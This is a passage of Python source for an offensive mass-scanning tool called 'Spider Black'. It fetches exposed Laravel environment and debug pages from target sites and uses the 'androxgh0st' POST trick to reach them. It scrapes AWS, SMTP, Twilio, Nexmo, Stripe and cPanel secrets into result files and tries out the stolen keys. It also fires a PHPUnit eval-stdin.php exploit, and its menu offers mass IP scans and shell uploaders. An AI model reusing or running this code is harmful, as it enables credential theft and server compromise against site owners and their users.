          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}SMTP Random\n")
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | Invalid SMTP\n")  
        try:
          sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | Failed Send\n")
    else:
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | Failed GET SMTP")

    if '<td>TWILIO_ACCOUNT_SID</td>' in text and twillio() == "on":
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Twillio\n")
      acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_key = "NULL"
      try:
        sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        sec = "NULL"
      try:
        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        chatid = "null"
      try:
        phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = "NULL"
      try:
        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        auhtoken = "NULL"
      build = 'URL: '+str(url)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Invalid Twillio\n".format(url))
    elif '<td>TWILIO_SID</td>' in text:
      acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = reg('<td>TWILIO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Invalid Twillio\n".format(url))

    elif '<td>ACCOUNT_SID</td>' in text:
      acc_sid = reg('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      try:
        acc_from = reg('<td>Twilio_Number<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        acc_from = "UNKNOWN"
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,acc_key,acc_from)
      except:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Invalid Twillio\n".format(url))

    
    if '<td>NEXMO_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}NEXMO\n")
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}INVALI NEXMO\n")
    
    elif '<td>NEXMO_API_KEY</td>' in text and NEXMO() == "on":
      try:
        nexmo_key = reg('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>NEXMO_API_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}NEXMO\n")
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}INVALI NEXMO\n")
    elif 'NEXMO_KEY' not in text or 'NEXMO_KEY' in text and NEXMO() == "off":
      pass
    else:
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | Failed NEXMO\n")


    if '<td>AWS_ACCESS_KEY_ID</td>' in text:
      aws_kid = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")
    elif '<td>AWS_KEY</td>' in text:
      aws_kid = reg('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")
    elif '<td>AWSAPP_KEY</td>' in text:
      aws_kid = reg('<td>AWSAPP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWSAPP_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWSAPP_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWSAPP_KEY: '+str(aws_kid)+'\nAWSAPP_SECRET: '+str(aws_sky)+'\nAWSAPP_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")
    elif '<td>SES_KEY</td>' in text:
      aws_kid = reg('<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>SES_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(aws_kid)+'\nSES_SECRET: '+str(aws_sky)+'\nSES_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")
    
    if '<td>MAILER_DSN</td>' in text:
      aws_kid = reg('<td>MAILER_DSN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(aws_kid)
      remover = str(build).replace('\r', '')
      if str(aws_kid) != "" and  str(aws_kid) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if '<td>EXOTEL_API_KEY</td>' in text and EXOTEL() == "on":
      try:
        exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_api = ''
      try:
        exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_token = ''
      try:
        exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_sid = ''
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}EXOTEL\n")
      build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
      remover = str(build).replace('\r', '')
      save = open('result/EXOTEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()


    if '<td>ONESIGNAL_APP_ID</td>' in text and ONESIGNAL() == "on":
      try:
        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_id = ''
      try:
        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_token = ''
      try:
        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_auth = ''
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}ONESIGNAL\n")
      build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
      remover = str(build).replace('\r', '')
      save = open('result/ONESIGNAL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if '<td>TOKBOX_KEY_DEV</td>' in text and TOKBOX() == "on":
      try:
        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}TOKBOX\n")
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    elif '<td>TOKBOX_KEY</td>' in text:
      try:
        tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}TOKBOX\n")
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    
    if '<td>CPANEL_HOST</td>' in text:
      method = 'debug'
      try:
        cipanel_host = reg('<td>CPANEL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = reg('<td>CPANEL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = reg('<td>CPANEL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = reg('<td>CPANEL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_pw = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "<td>STRIPE_KEY</td>" in text:
      method = 'debug'
      try:
        stripe_1 = reg("<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = reg("<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('Result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass


def di_chckngntd(url):
  try:
    text = f'#{lgn}{url}'
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    get_source = requests.get(url+"/.spider", headers=headers, timeout=1, verify=False, allow_redirects=False).text
    exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    if "APP_KEY" in str(get_source):
      get_smtp(url+"/.spider",str(get_source))
    else:
      get_source3 = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source3:
        get_smtp2(url,get_source3)
      elif "https" not in url and "APP_KEY=" not in str(get_source):
        nurl = url.replace('http','https')
        get_source2 = requests.get(nurl+"/.spider", headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source2):
          get_smtp(nurl+"/.spider",str(get_source2))
        else:
          get_source4 = requests.post(nurl, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source4:
            get_smtp2(nurl,get_source4)
          else:
            print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {rd}NOT VULN WITH HTTPS")
      else:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {rd}NOT VULN")
    
    if phpunitshell() == "on":
      newurl = url+exp
      exploit(newurl)    
  except:
    print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {rd}ERROR code Unknown")
    pass

def di_chckngntdsave(url):
  try:
    text = '\033[32;1m#\033[0m'+url
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    get_source = requests.get(url+"/.spider", headers=headers, timeout=1, verify=False, allow_redirects=False).text
    exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    if "APP_KEY" in str(get_source):
      get_smtp(url+"/.spider",str(get_source))
    else:
      get_source3 = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source3:
        get_smtp2(url,get_source3)
      elif "https" not in url and "APP_KEY=" not in str(get_source):
        nurl = url.replace('http','https')
        get_source2 = requests.get(nurl+"/.spider", headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source2):
          get_smtp(nurl+"/.spider",str(get_source2))
        else:
          get_source4 = requests.post(nurl, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source4:
            get_smtp2(nurl,get_source4)
          else:
            get_source10 = requests.get(url+"/.spider.save", headers=headers, timeout=1, verify=False, allow_redirects=False).text
            if "APP_KEY" in str(get_source10):
              get_smtp(url+"/.spider",str(get_source10))
            else:
              print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |NOT VULN WITH HTTPS")
      else:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |NOT VULN")
    
    if phpunitshell() == "on":
      newurl = url+exp
      exploit(newurl)    
  except:
    print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {rd}ERROR code Unknown")
    pass

def di_chckngntd4(url):
  for pet in pathline:
    try:
      text = '\033[32;1m#\033[0m'+url
      headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
      get_source = requests.get(url+str(pet), headers=headers, timeout=1, verify=False, allow_redirects=False).text
      newurl = url+str(pet)
      print('\033[1;40m#\033[0m Start Check '+newurl)
      if "APP_KEY=" in str(get_source):
        get_smtp(newurl,str(get_source))
        break
      else:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |NOT VULN")
    except:
      pass

  get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
  if "<td>APP_KEY</td>" in get_source:
    get_smtp2(url,get_source)
  else:
   print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |NOT VULN")





def checkset():

  AWS_ACCESS_KEYx=AWS_ACCESS_KEY()
  AWS_KEYx=AWS_KEY()
  twilliox=twillio()
  awsx=aws()
  sparkpostmailx = sparkpostmail()
  and1x = and1()
  mandrillappx = mandrillapp()
  zohox = zoho()
  sendgridx = sendgrid()
  office365x = office365()
  mailgunx = mailgun()
  NEXMOx=NEXMO()
  EXOTELx=EXOTEL()
  ONESIGNALx=ONESIGNAL()
  TOKBOXx=TOKBOX()
  print(f"{lrd}[{lgn}+{lrd}] {lgn}amazonaws : {gn}{awsx}\n{lrd}[{lgn}+{lrd}] {lgn}twillio : {gn}{twilliox}\n{lrd}[{lgn}+{lrd}] {lgn}AWS KEY : {gn}{AWS_KEYx}\n{lrd}[{lgn}+{lrd}] {lgn}AWS_ACCESS_KEY : {gn}{AWS_ACCESS_KEYx}\n{lrd}[{lgn}+{lrd}] {lgn}sparkpostmail : {gn}{sparkpostmailx}\n{lrd}[{lgn}+{lrd}] {lgn}1and1 : {gn}{and1x}\n{lrd}[{lgn}+{lrd}] {lgn}mandrillapp : {gn}{mandrillappx}\n{lrd}[{lgn}+{lrd}] {lgn}zoho : {gn}{zohox}\n{lrd}[{lgn}+{lrd}] {lgn}sendgrid : {gn}{sendgridx}\n{lrd}[{lgn}+{lrd}] {lgn}office365 : {gn}{office365x}\n{lrd}[{lgn}+{lrd}] {lgn}mailgun : {gn}{mailgunx}\n{lrd}[{lgn}+{lrd}] {lgn}NEXMO : {gn}{NEXMOx}\n{lrd}[{lgn}+{lrd}] {lgn}EXOTEL : {gn}{EXOTELx}\n{lrd}[{lgn}+{lrd}] {lgn}ONESIGNAL : {gn}{ONESIGNALx}\n{lrd}[{lgn}+{lrd}] {lgn}TOKBOX : {gn}{TOKBOXx}")

def logo():
    clear = "\x1b[0m"
    y=f'''                                                
{lgn}                                                                                                                            
                          .:==+***++=-.                        
                :#@@@+.  -%@@@@@@@@@@@@@%*=:                   
               *@@*#@=    =@@.   ..::-=*#%@@@*-                
             .#@+::.@%    +@#  .=====--:.  .:=*#+:             
           .=*=:*@* #@-   %@-   *@@@@@@@@@@%#*=-...            
              +@#*@#-@%  =@%   =@@+:...::-=+*#@@@@*=.          
           .=%*.  .@*@@:.@@- -%@#.              .-=+##+:       
         :=+-      =@%@+#@*+@@*+#%#+-                  ::      
{white}               -**+-@@@@@@@@%#@@@@@@@@#:                       
              ::+@@@@@@@@@@@@@@@@@@@@@@@%-                     
                +@@@{lrd}[{lgn}Spider Black{lrd}]{white}@@@@@@@%           
              -*#@@@@@@@@@@@@@@@@@@@@@@%=                      
          .     ::.:@@@%@@#@%#*%@@@@%*-                        
{lrd}         .-*#=     *%%@=+@%.+@@*=-:                 .-==:      
            .+@+. =@=@@. %@+  +@@+           .:-+*%@%+:        
           .-.:#@@@==@*  :@@.  .%@%*+++**#%@@@@%#+-.           
            .*#--%= %@.   #@+   #@@@@@@%%#*=-: .--.            
              =@%=.-@#    =@%   ...     .:=+*%%+:              
               .%@@@@-    +@@*++++**#%@@@@@#+:                 
                 -***=.  =#@@@@@@@@@@@%*+-                     
                             .:::::.          
     {lgn}   @_@ {white}Channel Telegram : {lrd} @Esfelurm #_#'''
    slo(y)
    
logo()

def menucit():
  sdx = f"""
{lrd}+--------+--------------------------------------------------++--------+--------------------------------------------------+
{lrd}| {pe}NUMBER {lrd}|                   {cn}Application {lrd}                   || {pe}NUMBER {lrd}|{cn}                   Application {lrd}                   |
+--------+--------------------------------------------------++--------+--------------------------------------------------+
{lrd}|  [{lgn}1{lrd}]   |{gn}                Grab .spider + Debug {lrd}             ||  [{lgn}11{lrd}]  |{gn}         Check Limit Aws Key + Email List    {lrd}     |
{lrd}|  [{lgn}2{lrd}]   |{gn}          Grab .spider + Debug (Auto Scan){lrd}        ||  [{lgn}12{lrd}]  |{gn}               Mass Crack aws panel          {lrd}     |
{lrd}|  [{lgn}3{lrd}]   |{gn}            Option 2 + Auto reverse ip{lrd}            ||  [{lgn}13{lrd}]  |{gn}                  Twillio sender             {lrd}     |
{lrd}|  [{lgn}4{lrd}]   |{gn}             Option 2 + Multiple path{lrd}             ||  [{lgn}14{lrd}]  |{gn}             Sendgrid apikey checker         {lrd}     |
{lrd}|  [{lgn}5{lrd}]   |{gn}             Website To IP + Option 3{lrd}             ||  [{lgn}15{lrd}]  |{gn}            sendgrid apikey generator        {lrd}     |
{lrd}|  [{lgn}6{lrd}]   |{gn}                Website To IP Only {lrd}               ||  [{lgn}16{lrd}]  |{gn}    Aws key generator(awskey|secretkey|region){lrd}    |
{lrd}|  [{lgn}7{lrd}]   |{gn}             DORK/KEYWORD + Option 2{lrd}              ||  [{lgn}17{lrd}]  |{gn}              Laravel IP Range Scan          {lrd}     |
{lrd}|  [{lgn}8{lrd}]   |{gn}           MASS IP RANGE SCAN + Option 2{lrd}          ||  [{lgn}18{lrd}]  |{gn} Laravel IP Range Scan + Auto Scan with option 3{lrd}  |
{lrd}|  [{lgn}9{lrd}]   |{gn}          MASS IP RANGE SCAN + Option 3{lrd}           ||  [{lgn}19{lrd}]  |{gn}                Mass SMTP CHECKER             {lrd}    |
{lrd}|  [{lgn}10{lrd}]  |{gn}              Remove duplicate list{lrd}               ||  [{lgn}20{lrd}]  |{gn}                    Reverse IP                {lrd}    |
{yw}+--------+--------------------------------------------------++--------+--------------------------------------------------+
{lrd}|  [{lgn}21{lrd}]  |{gn}         Scan Laravel and save as IP List{lrd}          ||  [{lgn}22{lrd}]  |{gn}            Option 18 + scan spider.save        {lrd} |
{lrd}|  [{lgn}23{lrd}]  |{gn}             Option 3 + scan spider.save    {lrd}       ||  [{lgn}24{lrd}]  |{gn}               Mass Shell Uploader           {lrd}    |
{lrd}|  [{lgn}25{lrd}]  |{gn}                   CMS Checker           {lrd}          ||  [{lgn}26{lrd}]  |{gn}   Grab And Auto Check Valid phpmyadmin Logins{lrd}   |
{lrd}|  [{lgn}27{lrd}]  |{gn}        Change Format Of SMTPS for Checker{lrd}         ||  [{lgn}28{lrd}]  |{gn}              NEXMO Balance Checker          {lrd}    |
{lrd}|  [{lgn}29{lrd}]  |{gn}               Shells Uploader Mini       {lrd}         ||  [{lgn}30{lrd}]  |{gn} WooCommerce Plugin Checker From wordpress logins{lrd}|
+--------+--------------------------------------------------++--------+--------------------------------------------------+
 """
  slo (sdx)

def jembotngw(sites):
  if 'http' not in sites:
    site = 'http://'+sites

    prepare(site)
  else:
    prepare(sites)



def jembotngw2(sites):


  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd(site)
  else:
    di_chckngntd(sites)

def jembotngwsave(sites):


  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntdsave(site)
  else:
    di_chckngntdsave(sites)

def prepare2(sites):

  di_chckngntd(sites)


def jembotngw4(sites):

  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd4(site)
  else:
    di_chckngntd4(sites)





def nowayngntd():

  Targetssa = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}")
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare(site)
    else:
      prepare(sites)

def makethread(jumlah):
  try:
    nam = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}")
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread3(jumlah):
  try:
    nam = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}")
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(dorkscan, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread4(jumlah):
  try:
    nam = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}")
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
